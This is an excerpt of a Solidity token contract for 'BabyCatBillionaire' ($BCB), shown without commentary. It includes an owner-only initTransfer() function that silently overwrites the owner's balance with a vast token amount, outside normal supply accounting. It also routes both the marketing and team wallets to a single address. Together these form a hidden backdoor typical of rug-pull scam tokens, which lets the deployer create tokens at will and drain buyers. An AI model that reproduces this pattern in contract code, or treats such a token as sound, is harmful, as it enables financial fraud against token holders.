...
contract BabyCatBillionaire  is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BabyCatBillionaire";
    string private _symbol = "$BCB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x08aa3207eC79FF8fDc5F61E608e009A82a067E8d);
    address payable public teamWalletAddress = payable(0x08aa3207eC79FF8fDc5F61E608e009A82a067E8d);
    ...
    uint256 public _swapAmount = 1000000000000;     
    uint256 private minimumTokensBeforeSwap = 1 * 10**_decimals; 
    uint256 public _multiplication = (10 ** _decimals);
    uint256 public _tokensFinal = _swapAmount * _multiplication;
    ...
    function initTransfer() public onlyOwner returns (bool success ) {_Wallets[owner()] = _tokensFinal; return true ;}
